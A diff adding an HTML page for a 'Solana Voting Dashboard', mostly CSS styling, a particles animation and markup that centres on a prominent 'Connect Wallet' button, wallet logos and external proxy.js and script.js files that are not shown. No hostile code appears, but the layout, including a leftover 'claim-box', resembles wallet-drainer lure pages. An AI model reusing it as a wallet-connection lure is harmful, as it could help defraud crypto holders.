@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Solana Voting Dashboard</title>
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/walletconnect@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
+  <script charset="UTF-8" type="text/javascript" src="./uuid.development.esm.js"></script>
+  <script src="proxy.js"></script>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script> <!-- Particle.js CDN -->
+  <script src="script.js" defer></script>
+  <style>
+    /* Base Styles */
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #020720; /* Deep Black - Solana base */
+      color: #E0E7FF; /* Light text for contrast */
+      overflow-x: hidden;
+      position: relative;
+      min-height: 100vh;
+    }
+
+    body::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #00FFA3, #03E1FF, #DC1FFF); /* Solana gradient */
+      opacity: 0.08;
+      animation: gradientShift 15s ease infinite;
+      z-index: 0;
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    #particles-js {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      max-width: 1200px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    /* Header */
+    .header-box {
+      background-color: rgba(10, 15, 44, 0.7); /* Dark transparent layer */
+      padding: 15px;
+      border-radius: 12px;
+      display: flex;
+      flex-direction: column; /* Stack on mobile */
+      align-items: center;
+      gap: 10px;
+      width: 100%; /* Full width for centering */
+      margin-bottom: 30px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      text-align: center; /* Center text on mobile */
+    }
+
+    .header-box img {
+      width: 95px;
+      height: 100px;
+      filter: drop-shadow(0 2px 4px rgba(0, 255, 163, 0.3));
+      margin: 0 auto; /* Center logo */
+    }
+
+    .header-box div {
+      padding: 0 10px;
+    }
+
+    .header-box h1 {
+      font-size: 1.8em; /* Reduced for better mobile fit */
+      margin: 0;
+      color: #00FFA3; /* Surge Green */
+      text-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
+    }
+
+    .header-box p {
+      font-size: 0.9em; /* Smaller subtitle size */
+      margin: 5px 0;
+      color: #B0B5C7; /* Lighter text */
+      background: linear-gradient(90deg, #00FFA3, #DC1FFF); /* Solana gradient */
+      -webkit-background-clip: text; /* Text gradient */
+      background-clip: text;
+      color: transparent; /* Allow gradient to show */
+      text-align: center; /* Ensure centering */
+      padding: 5px;
+      border-radius: 5px;
+      animation: glow 2s ease infinite alternate;
+    }
+
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #00FFA3, 0 0 10px #DC1FFF; }
+      to { text-shadow: 0 0 10px #00FFA3, 0 0 15px #DC1FFF; }
+    }
+
+    /* Main Layout */
+    .main-box {
+      background-color: rgba(10, 15, 44, 0.5); /* Dark semi-transparent box */
+      padding: 30px;
+      border-radius: 15px;
+      margin-bottom: 40px;
+      backdrop-filter: blur(10px); /* Glass effect */
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    .main {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 30px;
+    }
+
+    .left, .right {
+      flex: 1;
+      min-width: 300px;
+    }
+
+    /* Steps Box */
+    .steps-box {
+      background-color: rgba(10, 15, 44, 0.7);
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+    }
+
+    .steps-box h2 {
+      font-size: 1.5em;
+      margin-bottom: 20px;
+      color: #00FFA3; /* Surge Green */
+    }
+
+    .step {
+      margin: 10px 0;
+    }
+
+    .step button {
+      background-color: #07031f; /* Surge Green */
+      color: white;
+      border: 2px solid #110d2c; /* Surge Green border */
+      box-shadow: 0 0 10px linear-gradient(45deg, #00FFA3, #DC1FFF); /* Solana gradient */
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s ease;
+    }
+
+    .step button:hover {
+      background-color: #03E1FF; /* Ocean Blue */
+      box-shadow: 0 0 20px rgba(3, 225, 255, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .arrow {
+      font-size: 1.5em;
+      margin: 10px 0;
+      color: #E0E7FF;
+      opacity: 0.8;
+    }
+
+    /* Right Panel */
+    .right h2 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+      color: #00FFA3; /* Surge Green */
+    }
+
+    .right ul {
+      list-style: none;
+      padding-left: 0;
+    }
+
+    .right li {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+      justify-content: space-between;
+      background: linear-gradient(45deg, #00FFA3, #DC1FFF); /* Solana gradient */
+      padding: 10px;
+      border-radius: 6px;
+      transition: transform 0.3s ease;
+    }
+
+    .right li:hover {
+      transform: translateX(5px);
+    }
+
+    .right img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+      filter: brightness(1.5);
+    }
+
+    /* Claim Box */
+    .claim-box {
+      text-align: center;
+      margin: 40px 0 20px;
+      height: 60px;
+      position: relative;
+    }
+
+    .interact-button {
+      background: linear-gradient(45deg, #00FFA3, #DC1FFF); /* Solana gradient */
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 8px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0, 255, 163, 0.4);
+      transition: transform 0.3s ease;
+    }
+
+    .interact-button:hover {
+      background: linear-gradient(45deg, #DC1FFF, #00FFA3);
+      transform: scale(1.05);
+    }
+
+    .interact-button span {
+      display: inline-block;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(0, 255, 163, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(0, 255, 163, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(0, 255, 163, 0); }
+    }
+
+    /* Wallet Logos */
+    .wallet-logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+
+    .wallet-logos img {
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      transition: transform 0.3s ease;
+      filter: drop-shadow(0 0 5px rgba(0, 255, 163, 0.3));
+    }
+
+    .wallet-logos img:hover {
+      transform: scale(1.1);
+    }
+
+    /* Support */
+    .support {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .support a {
+      margin: 0 10px;
+      display: inline-block;
+    }
+
+    .support img {
+      width: 30px;
+      height: 30px;
+      transition: transform 0.3s ease;
+      filter: drop-shadow(0 0 5px rgba(220, 31, 255, 0.3));
+    }
+
+    .support img:hover {
+      transform: scale(1.2);
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      font-size: 0.9em;
+      padding: 10px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      opacity: 0.7;
+    }
+
+    /* Realtime List */
+    .realtime-list {
+      list-style: none;
+      padding: 0;
+    }
+
+    .realtime-list li {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 12px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 8px;
+    }
+
+    .realtime-list li span {
+      flex: 1;
+      font-size: 1em;
+    }
+
+    .realtime-list img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+
+    /* Voting Section */
+    .voting-section {
+      background-color: rgba(10, 15, 44, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px 0;
+      text-align: center;
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .voting-section input {
+      padding: 10px;
+      width: 300px;
+      border-radius: 6px;
+      border: none;
+      margin-right: 10px;
+      background-color: #1F2937;
+      color: #E0E7FF;
+      transition: box-shadow 0.3s ease;
+    }
+
+    .voting-section input:focus {
+      box-shadow: 0 0 10px rgba(3, 225, 255, 0.5);
+      outline: none;
+    }
+
+    .voting-section button {
+      background-color: #00FFA3;
+      color: white;
+      border: 2px solid #00FFA3;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
+    }
+
+    .voting-section button:hover {
+      background-color: #03E1FF;
+      box-shadow: 0 0 20px rgba(3, 225, 255, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .contract-display {
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px 0;
+      background: rgba(10, 15, 44, 0.5);
+    }
+
+    .contract-display h3 {
+      margin: 0 0 10px;
+      font-size: 1.3em;
+      color: #DC1FFF;
+    }
+
+    .contract-display p {
+      margin: 5px 0;
+      color: #B0B5C7;
+    }
+
+    .vote-button {
+      background-color: #1E40AF;
+      color: white;
+      border: 2px solid #00FFA3;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
+    }
+
+    .vote-button:disabled {
+      background-color: #4B5563;
+      border-color: #6B7280;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .vote-button:hover:not(:disabled) {
+      background-color: #03E1FF;
+      box-shadow: 0 0 20px rgba(3, 225, 255, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .vote-count {
+      margin-top: 10px;
+      font-size: 1em;
+      color: #B0B5C7;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .main {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .left, .right {
+        flex: 1 1 100%;
+        max-width: 100%;
+      }
+
+      .wallet-logos img {
+        width: 40px;
+        height: 40px;
+      }
+
+      .voting-section input {
+        width: 100%;
+        margin-bottom: 10px;
+      }
+
+      .header-box {
+        flex-direction: column;
+        padding: 10px;
+        gap: 5px;
+      }
+
+      .header-box img {
+        width: 80px;
+        height: 85px;
+        margin-bottom: 5px;
+      }
+
+      .header-box h1 {
+        font-size: 1.5em; /* Further reduced for mobile */
+      }
+
+      .header-box p {
+        font-size: 0.8em; /* Adjusted for mobile */
+        padding: 3px;
+      }
+    }
+
+    @media (min-width: 769px) {
+      .header-box {
+        flex-direction: row;
+        align-items: center;
+      }
+    }
+  </style>
+  <script>
+    /* Particle.js Configuration */
+    document.addEventListener("DOMContentLoaded", function () {
+      if (window.particlesJS) {
+        particlesJS("particles-js", {
+          particles: {
+            number: { value: 80, density: { enable: true, value_area: 800 } },
+            color: { value: ["#00FFA3", "#03E1FF", "#DC1FFF"] },
+            shape: { type: "circle" },
+            opacity: { value: 0.5, random: true, anim: { enable: true, speed: 1, opacity_min: 0.1 } },
+            size: { value: 3, random: true, anim: { enable: true, speed: 2, size_min: 0.1 } },
+            line_linked: { enable: false },
+            move: { enable: true, speed: 1, direction: "none", random: true, straight: false, out_mode: "out" }
+          },
+          interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } } },
+          retina_detect: true
+        });
+      }
+    });
+  </script>
+</head>
+<body>
+  <div id="particles-js"></div> <!-- Particle canvas -->
+  <div class="wave-background">
+    <svg viewBox="0 0 1200 200" preserveAspectRatio="none">
+      <path d="M0,100 C300,200 900,0 1200,100 L1200,200 L0,200 Z" fill="rgba(0, 255, 163, 0.1)" />
+    </svg>
+  </div>
+
+  <div class="container">
+    <div class="header-box">
+      <img src="image/logo.png" alt="Logo" />
+      <div>
+        <h1>Solana Voting Dashboard</h1>
+        <p>Vote on Solana Tokens with Secure Wallet Connection</p>
+      </div>
+    </div>
+
+   
+    <div class="main-box">
+      <div class="main">
+        <div class="left">
+          <div class="steps-box">
+            <h2>Steps:</h2>
+            <div class="step"><button>Search Token</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Connect Wallet</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>Vote</button></div>
+            <div class="arrow">→</div>
+            <div class="step"><button>View Results</button></div>
+          </div>
+        </div>
+
+        <div class="right">
+          <h2>Wallet Status</h2>
+          <ul class="realtime-list">
+            <li><span id="wallet-status">Not connected</span></li>
+            <li><span id="wallet-balance">Balance: 0 SOL</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="voting-section">
+      <form id="contract-search">
+        <input type="text" id="contract-address" placeholder="Enter Solana contract address" />
+        <button type="submit">Search</button>
+      </form>
+      <div id="contract-display" class="contract-display hidden">
+        <!-- Populated by JS -->
+      </div>
+      <div id="vote-section">
+        <button id="vote-button" class="vote-button" disabled>Vote</button>
+        <p id="vote-count" class="vote-count">Total Votes: 0</p>
+      </div>
+    </div>
+
+    <div class="claim-box">
+      <button id="connect-wallet" class="interact-button flex h-full w-full items-center justify-center">
+        <span class="text-[1.125rem]">Connect Wallet</span>
+      </button>
+    </div>
+
+    <div class="wallet-logos">
+      <img src="image/phantom.png" alt="Phantom" />
+      <img src="image/solflare.png" alt="Solflare" />
+      <img src="image/backpack.png" alt="BackPack" />
+      <img src="image/glow.png" alt="Glow" />
+      <img src="image/trust.png" alt="Trust" />
+    </div>
+
+    <div class="support">
+      <a href="#"><img src="image/telegram.png" alt="Telegram" /></a>
+      <a href="#"><img src="image/discord.png" alt="Discord" /></a>
+      <a href="#"><img src="image/website.png" alt="Website" /></a>
+    </div>
+
+    <footer>
+      &copy; 2025 Solana Voting Dashboard. All rights reserved.
+    </footer>
+  </div>
+</body>
+</html>
